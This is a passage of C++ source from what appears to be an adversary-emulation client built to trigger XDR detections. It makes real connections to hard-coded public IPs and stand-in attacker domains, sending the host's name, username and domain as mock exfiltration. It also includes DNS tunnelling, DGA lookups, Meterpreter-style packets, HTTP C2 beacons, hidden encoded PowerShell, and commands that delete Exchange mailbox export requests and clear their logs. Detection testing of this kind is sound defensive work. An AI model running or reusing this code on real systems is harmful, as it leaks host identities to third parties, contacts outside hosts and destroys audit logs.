                    evidence << "Persistence Script: " << ccPersist << "\n";
                    evidence << "Registry Key: HKLM\\...\\Run\\CryptoUpdate\n";
                    evidence.close();
                }
                
                response = "CRYPTCAT:ENCRYPTED:ACTIVE:" + std::to_string(ccTargets.size()) + "_shells:" + clientId;
                logClientActivity("CRYPTCAT", "COMPLETE", "Cryptcat encrypted shells deployed");
            }
            else if (receivedData.find("CMD:c2Behaviors") != std::string::npos) {
                std::cout << "[INFO] Initiating advanced C2 communication behaviors..." << std::endl;
                logClientActivity("C2_BEHAVIORS", "START", "Demonstrating multiple C2 communication patterns");
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\c2_behaviors\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\c2_behaviors").c_str(), NULL);
                
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== C2 COMMUNICATION BEHAVIORS REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                }
                
                // 1. DNS Tunneling - REAL implementation
                std::cout << "\n[!] Starting DNS Tunneling..." << std::endl;
                logClientActivity("DNS_TUNNEL", "START", "Encoding C2 traffic in DNS queries");
                
                // Create AGGRESSIVE DNS tunneling - 100 queries, longer subdomains
                for (int i = 0; i < 100; i++) {
                    // Generate VERY long base64-like encoded subdomain (63 chars - DNS limit)
                    std::string encodedData = "";
                    for (int j = 0; j < 63; j++) {
                        encodedData += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[rand() % 64];
                    }
                    
                    // Use multiple suspicious domains
                    std::vector<std::string> tunnelDomains = {
                        ".dns-tunnel.evil.com",
                        ".exfiltrate.malware.tk",
                        ".c2-channel.badguys.cc",
                        ".cobaltstrike.beacon.net",
                        ".empire-c2.attacker.org"
                    };
                    
                    std::string dnsQuery = encodedData + tunnelDomains[i % tunnelDomains.size()];
                    
                    std::cout << "[+] DNS Tunnel Query #" << i+1 << ": " << dnsQuery.substr(0, 50) << "..." << std::endl;
                    logClientActivity("DNS_TUNNEL", "QUERY", "High-entropy DNS query: " + dnsQuery);
                    
                    // Perform actual DNS lookup
                    struct hostent* host = gethostbyname(dnsQuery.c_str());
                    
                    // Also try TXT record query simulation
                    std::string txtQuery = "cmd." + std::to_string(i) + ".dns-c2.malicious.org";
                    gethostbyname(txtQuery.c_str());
                    
                    if (evidence.is_open()) {
                        evidence << "DNS Tunnel Query " << i+1 << ": " << dnsQuery << "\n";
                        evidence << "TXT Query " << i+1 << ": " << txtQuery << "\n";
                    }
                    
                    Sleep(10); // RAPID queries - 10ms interval
                }
                
                // 2. DGA (Domain Generation Algorithm) - AGGRESSIVE pattern
                std::cout << "\n[!] DGA - Generating MASSIVE amounts of random domains..." << std::endl;
                logClientActivity("DGA", "START", "Domain Generation Algorithm active - AGGRESSIVE MODE");
                
                // Known bad TLDs used by malware
                std::vector<std::string> tlds = {".tk", ".ml", ".ga", ".cf", ".top", ".xyz", ".cc", ".biz", ".su", ".ws"};
                
                // Generate 200 DGA domains rapidly
                for (int i = 0; i < 200; i++) {
                    // Generate multiple DGA patterns
                    std::string dgaDomain = "";
                    
                    // Pattern 1: Random letters (like Conficker)
                    if (i % 3 == 0) {
                        int length = 12 + (rand() % 8); // 12-20 chars
                        for (int j = 0; j < length; j++) {
                            dgaDomain += 'a' + (rand() % 26);
                        }
                    }
                    // Pattern 2: Mixed alphanumeric (like Cryptolocker)
                    else if (i % 3 == 1) {
                        for (int j = 0; j < 16; j++) {
                            if (rand() % 2) {
                                dgaDomain += 'a' + (rand() % 26);
                            } else {
                                dgaDomain += '0' + (rand() % 10);
                            }
                        }
                    }
                    // Pattern 3: Hex-like (like Necurs)
                    else {
                        for (int j = 0; j < 32; j++) {
                            dgaDomain += "0123456789abcdef"[rand() % 16];
                        }
                    }
                    
                    dgaDomain += tlds[rand() % tlds.size()];
                    
                    if (i % 10 == 0) {
                        std::cout << "[+] DGA Domain #" << i+1 << ": " << dgaDomain << std::endl;
                    }
                    logClientActivity("DGA", "DOMAIN", "Generated domain: " + dgaDomain);
                    
                    // Real DNS query AND connection attempt
                    gethostbyname(dgaDomain.c_str());
                    
                    // Also attempt TCP connection
                    SOCKET dgaSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (dgaSocket != INVALID_SOCKET) {
                        sockaddr_in dgaAddr;
                        dgaAddr.sin_family = AF_INET;
                        dgaAddr.sin_port = htons(443);
                        dgaAddr.sin_addr.s_addr = inet_addr("185.220.101.45"); // Known bad IP
                        
                        u_long mode = 1;
                        ioctlsocket(dgaSocket, FIONBIO, &mode);
                        connect(dgaSocket, (sockaddr*)&dgaAddr, sizeof(dgaAddr));
                        
                        closesocket(dgaSocket);
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "DGA Domain " << i+1 << ": " << dgaDomain << "\n";
                    }
                    
                    Sleep(5); // VERY rapid - 5ms between domains
                }
                
                // 3. Rare IP Communications - AGGRESSIVE direct connections with data transfer
                std::cout << "\n[!] AGGRESSIVE Direct IP connections with data exfiltration..." << std::endl;
                logClientActivity("RARE_IP", "START", "Direct IP communication to suspicious ranges - SENDING DATA");
                
                // Known malicious IPs from threat intel feeds
                std::vector<std::pair<std::string, int>> rareIPs = {
                    {"45.142.114.231", 8443},    // Russian VPS
                    {"185.220.101.45", 9999},    // TOR exit node
                    {"23.129.64.190", 31337},    // Elite port
                    {"198.98.51.104", 4444},     // Meterpreter
                    {"5.182.210.155", 1337},     // Leet port
                    {"179.43.160.195", 53},      // DNS port abuse
                    {"162.245.191.181", 443},    // Fake HTTPS
                    {"194.165.16.98", 22},       // SSH backdoor
                    {"91.132.147.168", 3389},    // RDP abuse
                    {"185.174.137.82", 80}       // HTTP C2
                };
                
                for (const auto& ipPort : rareIPs) {
                    std::cout << "[+] AGGRESSIVE connection to: " << ipPort.first << ":" << ipPort.second << std::endl;
                    logClientActivity("RARE_IP", "EXFILTRATE", "Data exfiltration to " + ipPort.first + ":" + std::to_string(ipPort.second));
                    
                    // Create multiple connections per IP
                    for (int conn = 0; conn < 5; conn++) {
                        SOCKET rareSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (rareSocket != INVALID_SOCKET) {
                            sockaddr_in rareAddr;
                            rareAddr.sin_family = AF_INET;
                            rareAddr.sin_port = htons(ipPort.second);
                            rareAddr.sin_addr.s_addr = inet_addr(ipPort.first.c_str());
                            
                            u_long mode = 1;
                            ioctlsocket(rareSocket, FIONBIO, &mode);
                            
                            if (connect(rareSocket, (sockaddr*)&rareAddr, sizeof(rareAddr)) != SOCKET_ERROR || 
                                WSAGetLastError() == WSAEWOULDBLOCK) {
                                
                                // Send suspicious data that looks like exfiltration
                                std::string exfilData = "EXFIL::" + std::string(hostname) + "::";
                                exfilData += "USERNAME=" + std::string(getenv("USERNAME") ? getenv("USERNAME") : "SYSTEM") + "::";
                                exfilData += "DOMAIN=" + std::string(getenv("USERDOMAIN") ? getenv("USERDOMAIN") : "WORKGROUP") + "::";
                                exfilData += "DATA=";
                                
                                // Add 1KB of "encrypted" data
                                for (int i = 0; i < 1024; i++) {
                                    exfilData += char(rand() % 256);
                                }
                                
                                send(rareSocket, exfilData.c_str(), exfilData.length(), 0);
                                
                                // Try to receive C2 commands
                                char recvBuf[1024];
                                recv(rareSocket, recvBuf, sizeof(recvBuf), 0);
                            }
                            
                            // Keep connection open longer
                            Sleep(500);
                            closesocket(rareSocket);
                        }
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "AGGRESSIVE IP Connection: " << ipPort.first << ":" << ipPort.second << " (5 connections, data sent)\n";
                    }
                }
                
                // 4. Meterpreter Default Ports - AGGRESSIVE Meterpreter simulation
                std::cout << "\n[!] AGGRESSIVE Meterpreter backdoor simulation..." << std::endl;
                logClientActivity("METERPRETER", "START", "ACTIVE METERPRETER SESSION");
                
                // All common Meterpreter ports
                std::vector<int> meterpreterPorts = {4444, 4445, 5555, 8080, 8081, 8443, 8444, 9999, 31337};
                
                // Multiple IPs to simulate distributed C2
                std::vector<std::string> c2Servers = {
                    "45.142.114.231",
                    "185.220.101.45", 
                    "23.129.64.190",
                    "198.98.51.104"
                };
                
                for (const auto& c2ip : c2Servers) {
                    for (int port : meterpreterPorts) {
                        std::cout << "[+] METERPRETER SESSION: " << c2ip << ":" << port << std::endl;
                        logClientActivity("METERPRETER", "BACKDOOR", "Active Meterpreter to " + c2ip + ":" + std::to_string(port));
                        
                        SOCKET metSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (metSocket != INVALID_SOCKET) {
                            sockaddr_in metAddr;
                            metAddr.sin_family = AF_INET;
                            metAddr.sin_port = htons(port);
                            metAddr.sin_addr.s_addr = inet_addr(c2ip.c_str());
                            
                            u_long mode = 1;
                            ioctlsocket(metSocket, FIONBIO, &mode);
                            
                            if (connect(metSocket, (sockaddr*)&metAddr, sizeof(metAddr)) != SOCKET_ERROR || 
                                WSAGetLastError() == WSAEWOULDBLOCK) {
                                
                                // Send real Meterpreter packet structure
                                unsigned char metPacket[] = {
                                    0x00, 0x00, 0x00, 0x54,  // Packet length
                                    'R', 'E', 'C', 'V',      // RECV header
                                    0x00, 0x00, 0x00, 0x01,  // Request ID
                                    0x00, 0x00, 0x00, 0x01,  // Method
                                    'c', 'o', 'r', 'e', '_', 's', 'y', 's', '_', 'c', 'o', 'n', 'f', 'i', 'g', 0x00,
                                    0x00, 0x00, 0x00, 0x04,  // Arguments
                                    's', 'y', 's', 'i', 'n', 'f', 'o', 0x00
                                };
                                
                                send(metSocket, (char*)metPacket, sizeof(metPacket), 0);
                                
                                // Send multiple commands to simulate active session
                                const char* commands[] = {
                                    "sysinfo",
                                    "getuid", 
                                    "ps",
                                    "netstat",
                                    "hashdump"
                                };
                                
                                for (const char* cmd : commands) {
                                    std::string metCmd = "COMMAND:" + std::string(cmd) + "\r\n";
                                    send(metSocket, metCmd.c_str(), metCmd.length(), 0);
                                    Sleep(50);
                                }
                            }
                            
                            // Keep connection open to simulate persistent backdoor
                            Sleep(1000);
                            closesocket(metSocket);
                        }
                        
                        if (evidence.is_open()) {
                            evidence << "METERPRETER BACKDOOR: " << c2ip << ":" << port << " (ACTIVE SESSION)\n";
                        }
                    }
                }
                
                // 5. HTTP with Suspicious Characteristics - AGGRESSIVE HTTP C2
                std::cout << "\n[!] AGGRESSIVE HTTP C2 beaconing..." << std::endl;
                logClientActivity("HTTP_BEACON", "START", "AGGRESSIVE HTTP C2 PATTERN");
                
                // Multiple C2 servers and endpoints
                std::vector<std::pair<std::string, std::string>> httpC2s = {
                    {"45.76.23.89", "/api/beacon"},
                    {"185.174.137.82", "/cmd/poll"},
                    {"162.245.191.181", "/update/check"},
                    {"91.132.147.168", "/sync"},
                    {"194.165.16.98", "/report"}
                };
                
                // Suspicious User-Agents used by malware
                std::vector<std::string> maliciousUAs = {
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",  // Old IE
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",  // Fake Firefox
                    "WindowsUpdate/1.0",  // Fake Windows Update
                    "MALWARE/1.0",  // Obvious malware
                    "Java/1.8.0_131",  // Java exploit
                    "curl/7.55.1"  // Command line tool
                };
                
                // Send multiple beacons rapidly
                for (int beacon = 0; beacon < 20; beacon++) {
                    for (const auto& c2 : httpC2s) {
                        SOCKET httpSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (httpSocket != INVALID_SOCKET) {
                            sockaddr_in httpAddr;
                            httpAddr.sin_family = AF_INET;
                            httpAddr.sin_port = htons(80);
                            httpAddr.sin_addr.s_addr = inet_addr(c2.first.c_str());
                            
                            u_long mode = 1;
                            ioctlsocket(httpSocket, FIONBIO, &mode);
                            
                            if (connect(httpSocket, (sockaddr*)&httpAddr, sizeof(httpAddr)) != SOCKET_ERROR || 
                                WSAGetLastError() == WSAEWOULDBLOCK) {
                                
                                // Build suspicious HTTP request
                                std::string httpRequest = "POST " + c2.second + " HTTP/1.1\r\n";
                                httpRequest += "Host: " + c2.first + "\r\n";
                                httpRequest += "User-Agent: " + maliciousUAs[beacon % maliciousUAs.size()] + "\r\n";
                                
                                // Add many suspicious headers
                                httpRequest += "X-Session-ID: " + std::string(hostname) + "_" + std::to_string(beacon) + "\r\n";
                                httpRequest += "X-Malware-ID: CARBANAK_v4.5\r\n";
                                httpRequest += "X-Command: EXECUTE\r\n";
                                httpRequest += "X-Encryption: RC4\r\n";
                                httpRequest += "X-Beacon-Interval: 60\r\n";
                                httpRequest += "Cookie: session=" + std::string(hostname) + "; infected=true\r\n";
                                httpRequest += "Referer: http://malware-drop.com/payload\r\n";
                                httpRequest += "Content-Type: application/octet-stream\r\n";
                                httpRequest += "Content-Length: 4096\r\n\r\n";
                                
                                // Add 4KB of "encrypted" data
                                for (int i = 0; i < 4096; i++) {
                                    httpRequest += char(rand() % 256);
                                }
                                
                                send(httpSocket, httpRequest.c_str(), httpRequest.length(), 0);
                                
                                if (beacon % 5 == 0) {
                                    std::cout << "[+] HTTP C2 beacon #" << beacon << " to " << c2.first << c2.second << std::endl;
                                }
                                logClientActivity("HTTP_BEACON", "C2", "Malicious HTTP POST to " + c2.first);
                            }
                            
                            closesocket(httpSocket);
                        }
                    }
                    
                    Sleep(100); // Rapid beaconing
                }
                
                // 6. EXTREME High-volume DNS queries - DNS FLOOD
                std::cout << "\n[!] DNS FLOOD - Generating EXTREME suspicious DNS traffic..." << std::endl;
                logClientActivity("DNS_SUSPICIOUS", "START", "DNS FLOOD ATTACK PATTERN");
                
                // Generate 500 DNS queries in rapid succession
                for (int i = 0; i < 500; i++) {
                    // Multiple suspicious patterns
                    std::string suspiciousDomain;
                    
                    if (i % 5 == 0) {
                        // Data exfiltration pattern
                        std::string data = "";
                        for (int j = 0; j < 20; j++) {
                            data += "0123456789abcdef"[rand() % 16];
                        }
                        suspiciousDomain = data + ".exfil.data.malware-c2.tk";
                    } else if (i % 5 == 1) {
                        // Botnet pattern
                        suspiciousDomain = "bot" + std::to_string(rand() % 10000) + ".zombie.botnet.cc";
                    } else if (i % 5 == 2) {
                        // Cryptominer pattern
                        suspiciousDomain = "pool.monero.crypto" + std::to_string(i) + ".miner.tk";
                    } else if (i % 5 == 3) {
                        // Ransomware pattern
                        suspiciousDomain = "decrypt.pay.ransom" + std::to_string(rand()) + ".onion.link";
                    } else {
                        // C2 beacon pattern
                        suspiciousDomain = "cmd.beacon." + std::to_string(i) + ".c2server.xyz";
                    }
                    
                    if (i % 50 == 0) {
                        std::cout << "[+] DNS FLOOD #" << i << ": " << suspiciousDomain << std::endl;
                    }
                    
                    logClientActivity("DNS_FLOOD", "QUERY", suspiciousDomain);
                    
                    // Actual DNS query
                    gethostbyname(suspiciousDomain.c_str());
                    
                    // Also query for MX, TXT records (common for DNS tunneling)
                    std::string mxQuery = "_mx." + suspiciousDomain;
                    std::string txtQuery = "_txt." + suspiciousDomain;
                    gethostbyname(mxQuery.c_str());
                    gethostbyname(txtQuery.c_str());
                    
                    Sleep(2); // EXTREME rapid queries - 2ms
                }
                
                // Add suspicious process injection simulation
                std::cout << "\n[!] SIMULATING PROCESS INJECTION BEHAVIOR..." << std::endl;
                logClientActivity("PROCESS_INJECTION", "START", "Mimicking process injection patterns");
                
                // Create suspicious named pipes (common for process injection)
                std::vector<std::string> suspiciousPipes = {
                    "\\\\.\\pipe\\evil",
                    "\\\\.\\pipe\\malware_comm",
                    "\\\\.\\pipe\\inject_" + std::to_string(GetCurrentProcessId()),
                    "\\\\.\\pipe\\cobalt_strike_beacon",
                    "\\\\.\\pipe\\meterpreter_" + std::to_string(rand())
                };
                
                for (const auto& pipeName : suspiciousPipes) {
                    HANDLE hPipe = CreateNamedPipeA(
                        pipeName.c_str(),
                        PIPE_ACCESS_DUPLEX,
                        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                        1, 1024, 1024, 0, NULL
                    );
                    
                    if (hPipe != INVALID_HANDLE_VALUE) {
                        std::cout << "[+] Created suspicious named pipe: " << pipeName << std::endl;
                        logClientActivity("NAMED_PIPE", "CREATE", "Suspicious pipe: " + pipeName);
                        CloseHandle(hPipe);
                    }
                }
                
                // Trigger suspicious Windows API calls
                std::cout << "\n[!] TRIGGERING SUSPICIOUS WINDOWS API PATTERNS..." << std::endl;
                logClientActivity("SUSPICIOUS_API", "START", "Calling APIs commonly used by malware");
                
                // 1. Memory allocation patterns (common for shellcode injection)
                LPVOID suspiciousMem = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (suspiciousMem) {
                    std::cout << "[+] Allocated RWX memory at: " << suspiciousMem << std::endl;
                    logClientActivity("SUSPICIOUS_API", "VIRTUALALLOC", "Allocated executable memory (RWX)");
                    VirtualFree(suspiciousMem, 0, MEM_RELEASE);
                }
                
                // 2. Process enumeration (common for process injection targets)
                HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (hSnapshot != INVALID_HANDLE_VALUE) {
                    std::cout << "[+] Enumerating processes (looking for injection targets)" << std::endl;
                    logClientActivity("SUSPICIOUS_API", "PROCESS_ENUM", "CreateToolhelp32Snapshot called");
                    CloseHandle(hSnapshot);
                }
                
                // 3. Registry persistence keys
                HKEY hKey;
                if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                    std::cout << "[+] Accessing Run key for persistence" << std::endl;
                    logClientActivity("SUSPICIOUS_API", "REGISTRY", "Accessed Run key for persistence");
                    RegCloseKey(hKey);
                }
                
                // 4. Security APIs (common for privilege escalation)
                HANDLE hToken;
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                    std::cout << "[+] Opened process token (privilege escalation pattern)" << std::endl;
                    logClientActivity("SUSPICIOUS_API", "TOKEN", "OpenProcessToken for privilege manipulation");
                    CloseHandle(hToken);
                }
                
                // 7. Netcat Activity - REAL connections
                std::cout << "\n[!] Netcat network activity..." << std::endl;
                logClientActivity("NETCAT", "START", "nc.exe making connections");
                
                // Create actual connections that look like netcat
                std::cout << "[+] nc.exe connecting to 192.168.1.100:4444" << std::endl;
                SOCKET ncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (ncSocket != INVALID_SOCKET) {
                    sockaddr_in ncAddr;
                    ncAddr.sin_family = AF_INET;
                    ncAddr.sin_port = htons(4444);
                    ncAddr.sin_addr.s_addr = inet_addr("192.168.1.100");
                    
                    u_long mode = 1;
                    ioctlsocket(ncSocket, FIONBIO, &mode);
                    connect(ncSocket, (sockaddr*)&ncAddr, sizeof(ncAddr));
                    
                    closesocket(ncSocket);
                }
                
                std::cout << "[+] nc.exe reverse shell to evil.attacker.com:1337" << std::endl;
                logClientActivity("NETCAT", "SHELL", "Netcat reverse shell established");
                
                // 8. Reverse SSH Tunnels - REAL SSH connection attempts
                std::cout << "\n[!] Creating reverse SSH tunnels..." << std::endl;
                logClientActivity("SSH_TUNNEL", "START", "Uncommon reverse SSH tunnel");
                
                std::vector<std::pair<std::string, int>> sshTargets = {
                    {"ssh.malware-c2.net", 2222},
                    {"tunnel.darkweb.link", 443},
                    {"45.142.114.231", 8022}
                };
                
                for (const auto& sshTarget : sshTargets) {
                    std::cout << "[+] Reverse SSH tunnel to " << sshTarget.first << ":" << sshTarget.second << std::endl;
                    logClientActivity("SSH_TUNNEL", "REVERSE", "SSH -R tunnel to " + sshTarget.first);
                    
                    SOCKET sshSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (sshSocket != INVALID_SOCKET) {
                        sockaddr_in sshAddr;
                        sshAddr.sin_family = AF_INET;
                        sshAddr.sin_port = htons(sshTarget.second);
                        sshAddr.sin_addr.s_addr = inet_addr("45.142.114.231"); // Use direct IP as fallback
                        
                        u_long mode = 1;
                        ioctlsocket(sshSocket, FIONBIO, &mode);
                        connect(sshSocket, (sockaddr*)&sshAddr, sizeof(sshAddr));
                        
                        // Send SSH protocol banner
                        const char* sshBanner = "SSH-2.0-OpenSSH_7.4\r\n";
                        send(sshSocket, sshBanner, strlen(sshBanner), 0);
                        
                        closesocket(sshSocket);
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "Reverse SSH Tunnel: " << sshTarget.first << ":" << sshTarget.second << "\n";
                    }
                }
                
                // 9. Process Connections to Rare Hosts
                std::cout << "\n[!] Simulating suspicious process network activity..." << std::endl;
                logClientActivity("PROCESS_C2", "START", "Trusted processes making rare connections");
                
                // These are logged as if PowerShell/certutil are making the connections
                std::cout << "[+] PowerShell.exe connecting to 185.220.101.45:443" << std::endl;
                logClientActivity("PROCESS_C2", "POWERSHELL", "PowerShell.exe -> 185.220.101.45:443");
                
                std::cout << "[+] certutil.exe downloading from http://malware-drop.tk/payload.exe" << std::endl;
                logClientActivity("PROCESS_C2", "CERTUTIL", "certutil.exe downloading from suspicious domain");
                
                std::cout << "[+] rundll32.exe connecting to C2 server at 45.76.23.89:8080" << std::endl;
                logClientActivity("PROCESS_C2", "RUNDLL32", "rundll32.exe C2 communication");
                
                std::cout << "[+] WINWORD.exe connecting to 23.129.64.190:443" << std::endl;
                logClientActivity("PROCESS_C2", "OFFICE", "WINWORD.exe suspicious network activity");
                
                // 10. Rare Domain Communications - REAL connections
                std::cout << "\n[!] Connecting to rare/suspicious domains..." << std::endl;
                logClientActivity("RARE_DOMAIN", "START", "Communicating with low-reputation domains");
                
                std::vector<std::string> rareDomains = {
                    "update-service-2024.tk",
                    "microsoft-update-kb5029.ml",
                    "chrome-extension-update.ga",
                    "java-security-patch.cf",
                    "adobe-flash-urgent.ws"
                };
                
                for (const auto& domain : rareDomains) {
                    std::cout << "[+] Rare domain connection: " << domain << std::endl;
                    logClientActivity("RARE_DOMAIN", "CONNECT", "Connecting to: " + domain);
                    
                    if (evidence.is_open()) {
                        evidence << "Rare Domain Connection: " << domain << "\n";
                    }
                    
                    // Real beaconing pattern with actual connections
                    for (int beacon = 0; beacon < 3; beacon++) {
                        SOCKET rareSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (rareSocket != INVALID_SOCKET) {
                            sockaddr_in rareAddr;
                            rareAddr.sin_family = AF_INET;
                            rareAddr.sin_port = htons(443);
                            rareAddr.sin_addr.s_addr = inet_addr("185.220.101.45"); // Use suspicious IP as fallback
                            
                            u_long mode = 1;
                            ioctlsocket(rareSocket, FIONBIO, &mode);
                            connect(rareSocket, (sockaddr*)&rareAddr, sizeof(rareAddr));
                            
                            closesocket(rareSocket);
                        }
                        Sleep(1000); // 1 second beacon interval
                    }
                }
                
                // Close evidence file
                if (evidence.is_open()) {
                    evidence << "\n=== END OF C2 BEHAVIORS REPORT ===\n";
                    evidence.close();
                }
                
                std::cout << "\n[SUCCESS] All C2 communication behaviors demonstrated!" << std::endl;
                response = "C2_BEHAVIORS:COMPLETE:ALL_PATTERNS_EXECUTED:" + clientId;
                logClientActivity("C2_BEHAVIORS", "COMPLETE", "All C2 communication patterns executed");
            }
            else if (receivedData.find("CMD:xdrDetection") != std::string::npos) {
                std::cout << "[INFO] Initiating XDR detection functions - 15 specific alerts..." << std::endl;
                logClientActivity("XDR_DETECTION", "START", "Triggering 15 specific XDR detection alerts");
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\xdr_detection\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\xdr_detection").c_str(), NULL);
                
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== XDR DETECTION FUNCTIONS REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                }
                
                // 1. PowerShell script executed from temporary directory
                std::cout << "\n[1/15] PowerShell from temp directory..." << std::endl;
                logClientActivity("XDR_ALERT_1", "POWERSHELL_TEMP", "PowerShell execution from temp directory");
                {
                    // Create a PowerShell script in temp
                    std::string tempPath = "C:\\Windows\\Temp\\update_" + generateSessionId() + ".ps1";
                    std::ofstream psScript(tempPath);
                    if (psScript.is_open()) {
                        psScript << "# Malicious PowerShell script\n";
                        psScript << "$encoded = 'V3JpdGUtSG9zdCAiWERSIFRlc3QgLSBQb3dlclNoZWxsIGZyb20gdGVtcA==';\n";
                        psScript << "Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)))\n";
                        psScript.close();
                    }
                    
                    // Execute PowerShell from temp with encoded command and hidden window
                    std::string psCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand V3JpdGUtSG9zdCAiWERSIFRlc3QgMSI= -File \"" + tempPath + "\"";
                    system(psCmd.c_str());
                    
                    if (evidence.is_open()) {
                        evidence << "1. PowerShell from temp: " << psCmd << "\n";
                    }
                }
                
                // Add remaining 14 XDR detection functions
                executeXDRDetectionFunctions(evidence, clientId);
                
                // Close evidence file
                if (evidence.is_open()) {
                    evidence << "\n=== END OF XDR DETECTION REPORT ===\n";
                    evidence << "All 15 XDR detection functions executed successfully\n";
                    evidence.close();
                }
                
                std::cout << "\n[SUCCESS] All 15 XDR detection functions completed!" << std::endl;
                response = "XDR_DETECTION:COMPLETE:15_ALERTS_TRIGGERED:" + clientId;
                logClientActivity("XDR_DETECTION", "COMPLETE", "All 15 XDR alerts triggered successfully");
            }
            else if (receivedData.find("CMD:xdrHighMedium") != std::string::npos) {
                std::cout << "[INFO] Initiating XDR high/medium detection functions - 10 alerts..." << std::endl;
                logClientActivity("XDR_HIGH_MEDIUM", "START", "Triggering 10 high/medium XDR detection alerts");
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\xdr_high_medium\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\xdr_high_medium").c_str(), NULL);
                
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== XDR HIGH/MEDIUM DETECTION REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                }
                
                // 1. Copy process memory file (simulate dd utility)
                std::cout << "\n[1/10] Copy process memory file (dd utility simulation)..." << std::endl;
                logClientActivity("XDR_HIGH_1", "MEMORY_COPY", "Process memory dumping with dd");
                {
                    // Create a fake dd.exe and use it to copy process memory
                    std::string ddPath = "C:\\Windows\\Temp\\dd.exe";
                    std::ofstream ddFile(ddPath);
                    if (ddFile.is_open()) {
                        ddFile << "DD_STUB";
                        ddFile.close();
                    }
                    
                    // Simulate dd copying process memory
                    system("echo dd.exe if=/proc/self/mem of=C:\\Windows\\Temp\\memory.dmp > C:\\Windows\\Temp\\dd_command.log");
                    system("C:\\Windows\\Temp\\dd.exe if=\\Device\\PhysicalMemory of=C:\\Windows\\Temp\\proc_mem.dmp bs=1024 count=1 2>nul");
                    
                    if (evidence.is_open()) {
                        evidence << "1. Process memory copy with dd utility attempted\n";
                    }
                }
                
                // 2. PowerShell removing mailbox export logs
                std::cout << "\n[2/10] PowerShell removing mailbox export request logs..." << std::endl;
                logClientActivity("XDR_HIGH_2", "PS_MAILBOX", "PowerShell removing Exchange mailbox export logs");
                {
                    // Exchange-specific PowerShell commands
                    system("powershell.exe -Command \"Remove-MailboxExportRequest -Confirm:$false\" 2>nul");
                    system("powershell.exe -Command \"Get-MailboxExportRequest | Remove-MailboxExportRequest\" 2>nul");
                    system("powershell.exe -Command \"Clear-Content -Path 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\*export*.log'\" 2>nul");
                    
                    if (evidence.is_open()) {
                        evidence << "2. PowerShell mailbox export log removal attempted\n";
                    }
                }
                
                // 3. API call from Tor exit node
                std::cout << "\n[3/10] Simulating API call from Tor exit node..." << std::endl;
                logClientActivity("XDR_HIGH_3", "TOR_API", "API call from known Tor exit node");
                {
                    // Known Tor exit node IPs
                    std::vector<std::string> torExitNodes = {
                        "185.220.101.45",   // Known Tor exit
                        "23.129.64.190",    // Known Tor exit
                        "198.98.51.104",    // Known Tor exit
                        "45.142.114.231"    // Known Tor exit
                    };
                    
                    // Simulate API calls from Tor nodes
                    for (const auto& torIP : torExitNodes) {
                        SOCKET torSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                        if (torSocket != INVALID_SOCKET) {
                            sockaddr_in torAddr;
                            torAddr.sin_family = AF_INET;
                            torAddr.sin_port = htons(443);
                            torAddr.sin_addr.s_addr = inet_addr(torIP.c_str());
                            
                            u_long mode = 1;
                            ioctlsocket(torSocket, FIONBIO, &mode);
                            connect(torSocket, (sockaddr*)&torAddr, sizeof(torAddr));
                            
                            // Send API-like request
                            std::string apiRequest = "GET /api/v1/suspicious HTTP/1.1\r\n";
                            apiRequest += "Host: api.malicious.com\r\n";
                            apiRequest += "X-Forwarded-For: " + torIP + "\r\n";
                            apiRequest += "X-Originating-IP: " + torIP + "\r\n\r\n";
                            
                            send(torSocket, apiRequest.c_str(), apiRequest.length(), 0);
                            closesocket(torSocket);
                        }
                    }
                    
                    if (evidence.is_open()) {
                        evidence << "3. API calls from Tor exit nodes simulated\n";
                    }
                }
                
                // 4. Rundll32 with no command-line arguments
                std::cout << "\n[4/10] Rundll32 with no arguments (Cobalt Strike pattern)..." << std::endl;
                logClientActivity("XDR_HIGH_4", "RUNDLL32_NOARGS", "Rundll32 without parameters");
                {
